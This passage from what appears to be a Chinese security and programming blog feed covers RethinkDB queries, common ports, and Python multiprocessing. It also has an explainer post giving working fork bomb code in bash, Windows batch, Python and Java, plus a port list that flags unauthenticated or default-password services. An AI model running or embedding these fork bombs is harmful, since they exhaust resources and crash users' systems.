<h4 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">r.db(<span class="string">""</span>).table(<span class="string">""</span>).count()</div><div class="line">r.db(<span class="string">""</span>).table(<span class="string">""</span>).filter(&#123;<span class="string">""</span>:<span class="string">""</span>&#125;)</div><div class="line">r.table(<span class="string">'movies'</span>).filter(&#123;rank: 1&#125;)</div><div class="line">r.table(<span class="string">'movies'</span>).without(<span class="string">'id'</span>).distinct().count()   删除重复项</div><div class="line">r.table(<span class="string">'moviesUnique'</span>).orderBy(<span class="string">'rank'</span>).limit(10)  显示前十大电影</div><div class="line">r.table(<span class="string">'moviesUnique'</span>).orderBy(r.desc(<span class="string">'rank'</span>)).limit(10)</div></pre></td></tr></table></figure>
<p>详情请参考：<a href="https://rethinkdb.com/docs/reql-data-exploration/" target="_blank" rel="external">https://rethinkdb.com/docs/reql-data-exploration/</a></p>
]]></content>
      
        <categories>
            
            <category> 技术研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> rethinkdb </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Fork Bomb]]></title>
      <url>http://thief.one/2017/02/04/Fork-Bomb/</url>
      <content type="html"><![CDATA[<p>　　Fork炸弹（fork bomb）在计算机领域中是一种利用系统调用fork（或其他等效的方式）进行的拒绝服务攻击。fork炸弹以极快的速度创建大量进程（进程数呈以2为底数的指数增长趋势），并以此消耗系统分配予进程的可用空间使进程表饱和，而系统在进程表饱和后就无法运行新程序，除非进程表中的某一进程终止，它可以利用在windows/linux等系统。</p>
<h4 id="linux系统"><a href="#linux系统" class="headerlink" title="linux系统"></a>linux系统</h4><h5 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:()&#123; :|:&amp; &#125;;:</div></pre></td></tr></table></figure>
<h5 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h5><p>:()　# 定义函数,函数名为”:”,即每当输入”:”时就会自动调用{}内代码<br>{　　# “:”函數起始字元<br>:　　# 用递归方式调用”:”函数本身<br>|　　# 並用管線(pipe)將其輸出引至…（因为有一个管線操作字元，因此會生成一個新的進程）<br>:　　# 另一次递归调用的”:”函数 # 综上,”:|:”表示的即是每次調用函数”:”的時候就會產生兩份拷貝<br>&amp;　　# 調用間脱鉤,以使最初的”:”函数被關閉後為其所調用的兩個”:”函數還能繼續執行<br>}　　# “:”函數終止字元<br>;　　# “:”函数定义结束后将要进行的操作…<br>:　　# 调用”:”函数,”引爆”fork炸弹</p>
<h4 id="Windows系统-创建一个-bat，写入以下命令运行即可"><a href="#Windows系统-创建一个-bat，写入以下命令运行即可" class="headerlink" title="Windows系统(创建一个.bat，写入以下命令运行即可)"></a>Windows系统(创建一个.bat，写入以下命令运行即可)</h4><h5 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%0|%0|%0</div></pre></td></tr></table></figure>
<h5 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h5><p>%0就是输出自己本身,也就是.bat，在cmd中即表示运行.bat<br>|%0就是打开自身后的程序再打开.bat<br>3的指数倍</p>
<h5 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h5><p>一个防止其严重影响系统的方法就是限定一个用户能够创建的进程数的上限，在Linux系统上，可以通过ulimit这个指令达到相应的效果。</p>
<h4 id="编程语言应用"><a href="#编程语言应用" class="headerlink" title="编程语言应用"></a>编程语言应用</h4><p>Using Python:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import os</div><div class="line"><span class="keyword">while</span> 1:</div><div class="line">    os.fork()</div></pre></td></tr></table></figure>
<p>Using Java:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">public class ForkBomb</div><div class="line">&#123;</div><div class="line">  public static void main(String[] args)</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</div><div class="line">    &#123;</div><div class="line">      Runtime.getRuntime().exec(new String[]&#123;<span class="string">"javaw"</span>, <span class="string">"-cp"</span>, System.getProperty(<span class="string">"java.class.path"</span>), <span class="string">"ForkBomb"</span>&#125;);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>官方参考链接：<a href="https://en.wikipedia.org/wiki/Fork_bomb" target="_blank" rel="external">https://en.wikipedia.org/wiki/Fork_bomb</a></p>
]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 系统安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[常用端口服务]]></title>
      <url>http://thief.one/2017/01/24/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1/</url>
      <content type="html"><![CDATA[<p>范围：0-65535<br>固定端口：0-1023   1024保留<br>动态端口：1024-65535</p>
<h4 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a>常用端口</h4><p>21：FTP<br>22：SSH<br>23：Telnet<br>25：SMTP<br>53：DNS（UDP）<br>69：TFTP（cisco，类似FTP）<br>79：Finger<br>80：HTTP<br>110：POP3<br>111：RPC 远程过程调用<br>113：windows 验证服务<br>119：NNTP 网络新闻组传输协议<br>135：RPC 远程过程调用<br>137：NetBIOS<br>139：windows文件和打印机共享，Unix中的samba服务<br>161：SNMP 简单网络管理协议<br>389：LDAP<br>443：HTTPS<br>445：SMB<br>1080：socks代理服务<br>2601,2604：zebra路由，默认密码zebra<br>5900：vnc<br>8080：用户www代理服务</p>
<h4 id="木马病毒"><a href="#木马病毒" class="headerlink" title="木马病毒"></a>木马病毒</h4><p>5554：worm.Sasser病毒利用端口<br>7626：冰河病毒<br>8011：WAY2.4病毒<br>7306：Netspy3.0病毒<br>1024：YAI病毒</p>
<h4 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h4><p>7001,7002：weblogic<br>9080：webshpere应用程序<br>9090：webshpere管理工具<br>8080：tomcat默认端口<br>Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093，默认为8080</p>
<h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>3306：mysql<br>1433：sqlserver server<br>1434：sqlserver monitor<br>1521：oracle<br>5432：PostgreSQL<br>1158：ORACLE EMCTL<br>8080：Oracle XDB<br>2100：Oracle XDB FTP</p>
<h4 id="特殊服务（漏洞）"><a href="#特殊服务（漏洞）" class="headerlink" title="特殊服务（漏洞）"></a>特殊服务（漏洞）</h4><p>443：SSL心脏滴血<br>512,513,514：Rsync未授权访问<br>873：Rsync未授权访问<br>2375：docker remote api漏洞<br>5984：CouchDB<br>6379：redis未授权<br>7001,7002：WebLogic 默认弱口令，反序列化<br>9200,9300：elasticsearch未授权访问<br>11211：memcache未授权访问<br>27017,27018：Mongodb 未授权访问<br>28017：mongodb统计页面<br>50000：SAP命令执行<br>50070,50030：hadoop默认端口未授权访问</p>
<p><em>参考链接：<a href="https://www.secpulse.com/archives/54880.html" target="_blank" rel="external">https://www.secpulse.com/archives/54880.html</a></em></p>
]]></content>
      
        <categories>
            
            <category> 技术研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 系统服务 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Multiprocessing共享资源]]></title>
      <url>http://thief.one/2016/11/24/Multiprocessing%E5%85%B1%E4%BA%AB%E8%B5%84%E6%BA%90/</url>
      <content type="html"><![CDATA[<p>　　在使用多进程的过程中，最好不要使用共享资源，如果非得使用，则请往下看。Multiprocessing类中共享资源可以使用3种方式，分别是Queue，Array，Manager。这三个都是Multiprocessing自带的组件，使用起来也非常方便。注意：普通的全局变量是不能被子进程所共享的，只有通过Multiprocessing组件构造的数据结构可以被共享。</p>
<h3 id="Queue类"><a href="#Queue类" class="headerlink" title="Queue类"></a>Queue类</h3><p>使用Multiprocessing.Queue类，共享资源（share memory）（只适用Process类）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Process, Queue  </div><div class="line"></div><div class="line">def <span class="built_in">test</span>(queue):  </div><div class="line">    queue.put(<span class="string">"Hello World"</span>)  </div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    q = Queue()  </div><div class="line">    p = Process(target=<span class="built_in">test</span>, args=(q,))  <span class="comment">#需要将q对象传递给子进程</span></div><div class="line">    p.start()</div><div class="line"></div><div class="line">    <span class="built_in">print</span> q.get()</div></pre></td></tr></table></figure>
<p>缺点：不能再Pool进程池中使用。</p>
<h3 id="Array、Value类"><a href="#Array、Value类" class="headerlink" title="Array、Value类"></a>Array、Value类</h3><p>使用Multiprocessing.Array类，共享资源（share memory）（只适用于Process类）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Process, Array</div><div class="line"></div><div class="line">def <span class="built_in">test</span>(a):</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</div><div class="line">        a[i] = <span class="_">-a</span>[i]</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    arr = Array(<span class="string">'i'</span>, range(10))</div><div class="line">    p = Process(target=<span class="built_in">test</span>, args=(arr))  <span class="comment">#需要将arr对象传递给子进程</span></div><div class="line">    p.start()</div><div class="line">    p.join()</div><div class="line">    <span class="built_in">print</span> arr[:]</div></pre></td></tr></table></figure>
<p>缺点：无法与Pool一起使用。</p>
<h3 id="Manager类"><a href="#Manager类" class="headerlink" title="Manager类"></a>Manager类</h3><p>使用Multiprocessing.Manager类，共享资源。（可以适用Pool类）</p>
<p>说明：由于windows操作系统下，创建Multiprocessing类对象代码一定要放在main()函数下，而linux不需要，因此这里区分2个版本。</p>
<p>实例目的：父进程在执行子进程的过程中，同步判断一个公共资源值，如果满足条件则结束所有进程。</p>
<h4 id="linux版本"><a href="#linux版本" class="headerlink" title="linux版本"></a>linux版本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Manager,Pool</div><div class="line"></div><div class="line">lists=Manager().list()    <span class="comment">##定义可被子进程共享的全局变量lists</span></div><div class="line"></div><div class="line">def <span class="built_in">test</span>(i):</div><div class="line">     <span class="built_in">print</span> i</div><div class="line">     lists.append(i)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    pool=Pool()</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(10000000):</div><div class="line">    	<span class="string">''</span><span class="string">'</span></div><div class="line">    	判断如果lists长度大于0，则不再往进程池中添加进程。</div><div class="line">    	'<span class="string">''</span></div><div class="line">        <span class="keyword">if</span> len(lists)&lt;=0:</div><div class="line">            pool.apply_async(<span class="built_in">test</span>,args=(i,))</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="built_in">break</span></div><div class="line">     pool.close()</div><div class="line">     pool.join()</div></pre></td></tr></table></figure>
<p>优点：可以跟Pool一起用，且速度比较快。</p>
<h4 id="windows版本"><a href="#windows版本" class="headerlink" title="windows版本"></a>windows版本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Manager</div><div class="line"></div><div class="line">def <span class="built_in">test</span>(i,lists):</div><div class="line">     <span class="built_in">print</span> i</div><div class="line">     lists.append(i)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    pool=Pool()</div><div class="line">    lists=Manager().list() <span class="comment">#Manager类实例化代码只能写在main()函数里面</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(10000000):</div><div class="line">        <span class="keyword">if</span> len(lists)&lt;=0:</div><div class="line">        	<span class="string">''</span><span class="string">'</span></div><div class="line">        	在创建子进程时，需要将lists对象传入，不然无法共享。</div><div class="line">        	'<span class="string">''</span></div><div class="line">            pool.apply_async(<span class="built_in">test</span>,args=(i,lists))<span class="comment">##需要将lists对象传递给子进程，这里比较耗资源，原因可能是因为Manager类是基于通信的。</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="built_in">break</span></div></pre></td></tr></table></figure>
<p>说明：与linux版本代码相比，windows下代码将lists的引用放在了main()之后，因为windows下只能在main函数下引用多进程。而在实例化子进程时，必须把Manager对象传递给子进程，否则lists无法被共享，而这个过程会消耗巨大资源，因此性能很差。<br>缺点：速度很慢，因此在windows下想要提前结束所有进程，可以使用获取返回值的方式，参考<a href="http://thief.one/2016/11/24/Multiprocessing子进程返回值">Multiprocessing子进程返回值</a></p>
<p><hr><br>更多多进程用法，请移驾:    <a href="http://thief.one/2016/11/23/Python-multiprocessing/">Python Multiprocessing</a></p>
]]></content>
      
        <categories>
            
            <category> 编程之道 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Multiprocessing </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Multiprocessing子进程返回值]]></title>
      <url>http://thief.one/2016/11/24/Multiprocessing%E5%AD%90%E8%BF%9B%E7%A8%8B%E8%BF%94%E5%9B%9E%E5%80%BC/</url>
      <content type="html"><![CDATA[<p>　　在实际使用多进程的时候，可能需要获取到子进程运行的返回值。如果只是用来存储，则可以将返回值保存到一个数据结构中；如果需要判断此返回值，从而决定是否继续执行所有子进程，则会相对比较复杂。另外在Multiprocessing中，可以利用Process与Pool创建子进程，这两种用法在获取子进程返回值上的写法上也不相同。这篇中，我们直接上代码，分析多进程中获取子进程返回值的不同用法，以及优缺点。</p>
<h4 id="初级用法（Pool）"><a href="#初级用法（Pool）" class="headerlink" title="初级用法（Pool）"></a>初级用法（Pool）</h4><p>目的：存储子进程返回值</p>
<p>说明：如果只是单纯的存储子进程返回值，则可以使用Pool的apply_async异步进程池；当然也可以使用Process，用法与threading中的相同，这里只介绍前者。</p>
<p>实例：当进程池中所有子进程执行完毕后，输出每个子进程的返回值。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">from multiprocessing import Pool</div><div class="line"></div><div class="line">def <span class="built_in">test</span>(p):     </div><div class="line">    <span class="built_in">return</span> p</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    pool = Pool(processes=10)</div><div class="line">    result=[]</div><div class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> xrange(50000):</div><div class="line">       <span class="string">''</span><span class="string">'</span></div><div class="line">       for循环执行流程：</div><div class="line">       （1）添加子进程到pool，并将这个对象（子进程）添加到result这个列表中。（此时子进程并没有运行）</div><div class="line">       （2）执行子进程（同时执行10个）</div><div class="line">       '<span class="string">''</span></div><div class="line">       result.append(pool.apply_async(<span class="built_in">test</span>, args=(i,)))<span class="comment">#维持执行的进程总数为10，当一个进程执行完后添加新进程.       </span></div><div class="line">    pool.join()</div><div class="line"></div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    遍历result列表，取出子进程对象，访问get()方法，获取返回值。（此时所有子进程已执行完毕）</div><div class="line">    '<span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</div><div class="line">        <span class="built_in">print</span> i.get()</div></pre></td></tr></table></figure>
<p>错误写法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> xrange(50000):</div><div class="line">   t=pool.apply_async(<span class="built_in">test</span>, args=(i,)))</div><div class="line">   <span class="built_in">print</span> t.get()</div></pre></td></tr></table></figure>
<p>说明：这样会造成阻塞，因为get()方法只能等子进程运行完毕后才能调用成功，否则会一直阻塞等待。如果写在for循环内容，相当于变成了同步，执行效率将会非常低。</p>
<h4 id="高级用法（Pool）"><a href="#高级用法（Pool）" class="headerlink" title="高级用法（Pool）"></a>高级用法（Pool）</h4><p>目的：父进程实时获取子进程返回值，以此为标记结束所有进程。</p>
<h5 id="实例（一）"><a href="#实例（一）" class="headerlink" title="实例（一）"></a>实例（一）</h5><p>执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">from multiprocessing import Pool</div><div class="line">import Queue</div><div class="line">import time</div><div class="line"></div><div class="line">def <span class="built_in">test</span>(p):</div><div class="line">    time.sleep(0.001)</div><div class="line">    <span class="keyword">if</span> p==10000:</div><div class="line">        <span class="built_in">return</span> True</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">return</span> False</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    pool = Pool(processes=10)</div><div class="line">    q=Queue.Queue()</div><div class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> xrange(50000):</div><div class="line">    	<span class="string">''</span><span class="string">'</span></div><div class="line">    	将子进程对象存入队列中。</div><div class="line">    	'<span class="string">''</span></div><div class="line">        q.put(pool.apply_async(<span class="built_in">test</span>, args=(i,)))<span class="comment">#维持执行的进程总数为10，当一个进程执行完后添加新进程.       </span></div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    因为这里使用的为pool.apply_async异步方法，因此子进程执行的过程中，父进程会执行while，获取返回值并校验。</div><div class="line">    '<span class="string">''</span></div><div class="line">    <span class="keyword">while</span> 1:</div><div class="line">        <span class="keyword">if</span> q.get().get():</div><div class="line">            pool.terminate() <span class="comment">#结束进程池中的所有子进程。</span></div><div class="line">            <span class="built_in">break</span></div><div class="line">    pool.join()</div></pre></td></tr></table></figure>
<p>说明：总共要执行50000个子进程（并发数量为10），当其中一个子进程返回True时，结束进程池。因为使用了apply_async为异步进程，因此在执行完for循环的添加子进程操作后（只是添加并没有执行完所有的子进程），可以直接执行while代码，实时判断子进程返回值是否有True，有的话结束所有进程。</p>
<p>优点：不必等到所有子进程结束再结束程序，只要得到想要的结果就可以提前结束，节省资源。</p>
<p>不足：当需要执行的子进程非常大时，不适用，因为for循环在添加子进程时，要花费很长的时间，虽然是异步，但是也需要等待for循环添加子进程操作结束才能执行while代码，因此会比较慢。</p>
<h5 id="实例（二）"><a href="#实例（二）" class="headerlink" title="实例（二）"></a>实例（二）</h5><p>多线程+多进程，添加执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Pool</div><div class="line">import Queue</div><div class="line">import threading</div><div class="line">import time</div><div class="line"></div><div class="line">def <span class="built_in">test</span>(p):</div><div class="line">    time.sleep(0.001)</div><div class="line">    <span class="keyword">if</span> p==10000:</div><div class="line">        <span class="built_in">return</span> True</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">return</span> False</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line"></div><div class="line">    result=Queue.Queue() <span class="comment">#队列</span></div><div class="line">    pool = Pool()</div><div class="line"></div><div class="line">    def pool_th():</div><div class="line">        <span class="keyword">for</span> i  <span class="keyword">in</span> xrange(50000000): <span class="comment">##这里需要创建执行的子进程非常多</span></div><div class="line">            try:</div><div class="line">                result.put(pool.apply_async(<span class="built_in">test</span>, args=(i,)))</div><div class="line">            except:</div><div class="line">                <span class="built_in">break</span></div><div class="line"></div><div class="line">    def result_th():</div><div class="line">        <span class="keyword">while</span> 1:</div><div class="line">            a=result.get().get() <span class="comment">#获取子进程返回值</span></div><div class="line">            <span class="keyword">if</span> a:</div><div class="line">                pool.terminate() <span class="comment">#结束所有子进程</span></div><div class="line">                <span class="built_in">break</span></div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    利用多线程，同时运行Pool函数创建执行子进程，以及运行获取子进程返回值函数。</div><div class="line">    '<span class="string">''</span></div><div class="line">    t1=threading.Thread(target=pool_th)</div><div class="line">    t2=threading.Thread(target=result_th)</div><div class="line">    t1.start()</div><div class="line">    t2.start()</div><div class="line">    t1.join()</div><div class="line">    t2.join()</div><div class="line"></div><div class="line">    pool.join()</div></pre></td></tr></table></figure>
<p>执行流程：利用多线程，创建一个执行pool_th函数线程，一个执行result_th函数线程，pool_th函数用来添加进程池，开启进程执行功能函数并将子进程对象存入队列，而result_th()函数用来不停地从队列中取子进程对象，调用get（）方法获取返回值。等发现其中存在子进程的返回值为True时，结束所有进程，最后结束线程。</p>
<p>优点：弥补了实例（一）的不足，即使for循环的子进程数量很多，也能提高性能，因为for循环与判断子进程返回值同时进行。</p>
<p><hr><br>更多多进程用法，请移驾:    <a href="http://thief.one/2016/11/23/Python-multiprocessing/">Python Multiprocessing</a></p>
]]></content>
      
        <categories>
            
            <category> 编程之道 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Multiprocessing </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Multiprocessing.Pool]]></title>
      <url>http://thief.one/2016/11/24/Multiprocessing-Pool/</url>
      <content type="html"><![CDATA[<p>　　Multiprocessing.Pool可以提供指定数量的进程供用户调用，当有新的请求提交到pool中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到规定最大值，那么该请求就会等待，直到池中有进程结束，才会创建新的进程来执行它。在共享资源时，只能使用Multiprocessing.Manager类，而不能使用Queue或者Array。</p>
<h4 id="Pool介绍"><a href="#Pool介绍" class="headerlink" title="Pool介绍"></a>Pool介绍</h4><h5 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h5><p>Pool类用于需要执行的目标很多，而手动限制进程数量又太繁琐时，如果目标少且不用控制进程数量则可以用<a href="http://thief.one/2016/11/24/Multiprocessing-Process">Process</a>类。</p>
<h5 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h5><ul>
<li>Pool([processes[, initializer[, initargs[, maxtasksperchild[, context]]]]])</li>
<li>processes ：使用的工作进程的数量，如果processes是None那么使用 os.cpu_count()返回的数量。</li>
<li>initializer： 如果initializer是None，那么每一个工作进程在开始的时候会调用initializer(*initargs)。</li>
<li>maxtasksperchild：工作进程退出之前可以完成的任务数，完成后用一个新的工作进程来替代原进程，来让闲置的资源被释放。maxtasksperchild默认是None，意味着只要Pool存在工作进程就会一直存活。</li>
<li>context: 用在制定工作进程启动时的上下文，一般使用 multiprocessing.Pool() 或者一个context对象的Pool()方法来创建一个池，两种方法都适当的设置了context。</li>
</ul>
<h5 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h5><ul>
<li>apply_async(func[, args[, kwds[, callback]]]) 它是非阻塞。</li>
<li>apply(func[, args[, kwds]])是阻塞的。</li>
<li>close()    关闭pool，使其不在接受新的任务。</li>
<li>terminate()    关闭pool，结束工作进程，不在处理未完成的任务。</li>
<li>join()    主进程阻塞，等待子进程的退出， join方法要在close或terminate之后使用。</li>
</ul>
<h4 id="Pool使用方法"><a href="#Pool使用方法" class="headerlink" title="Pool使用方法"></a>Pool使用方法</h4><h5 id="Pool-map函数"><a href="#Pool-map函数" class="headerlink" title="Pool+map函数"></a>Pool+map函数</h5><p>说明：此写法缺点在于只能通过map向函数传递一个参数。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Pool</div><div class="line"></div><div class="line">def <span class="built_in">test</span>(i):</div><div class="line">    <span class="built_in">print</span> i</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	lists=[1,2,3]</div><div class="line">	pool=Pool(processes=2) <span class="comment">#定义最大的进程数</span></div><div class="line">	pool.map(<span class="built_in">test</span>,lists)        <span class="comment">#p必须是一个可迭代变量。</span></div><div class="line">	pool.close()</div><div class="line">	pool.join()</div></pre></td></tr></table></figure>
<h5 id="异步进程池（非阻塞）"><a href="#异步进程池（非阻塞）" class="headerlink" title="异步进程池（非阻塞）"></a>异步进程池（非阻塞）</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Pool</div><div class="line"></div><div class="line">def <span class="built_in">test</span>(i):</div><div class="line">    <span class="built_in">print</span> i</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	pool = Pool(processes=10)</div><div class="line">	<span class="keyword">for</span> i  <span class="keyword">in</span> xrange(500):</div><div class="line">		<span class="string">''</span><span class="string">'</span></div><div class="line">		For循环中执行步骤：</div><div class="line">		（1）循环遍历，将500个子进程添加到进程池（相对父进程会阻塞）</div><div class="line">		（2）每次执行10个子进程，等一个子进程执行完后，立马启动新的子进程。（相对父进程不阻塞）</div><div class="line">		</div><div class="line">		apply_async为异步进程池写法。</div><div class="line">		异步指的是启动子进程的过程，与父进程本身的执行（print）是异步的，而For循环中往进程池添加子进程的过程，与父进程本身的执行却是同步的。</div><div class="line">		'<span class="string">''</span></div><div class="line">	    pool.apply_async(<span class="built_in">test</span>, args=(i,)) <span class="comment">#维持执行的进程总数为10，当一个进程执行完后启动一个新进程.       </span></div><div class="line"></div><div class="line">	<span class="built_in">print</span> “<span class="built_in">test</span>”</div><div class="line">	pool.close()</div><div class="line">	pool.join()</div></pre></td></tr></table></figure>
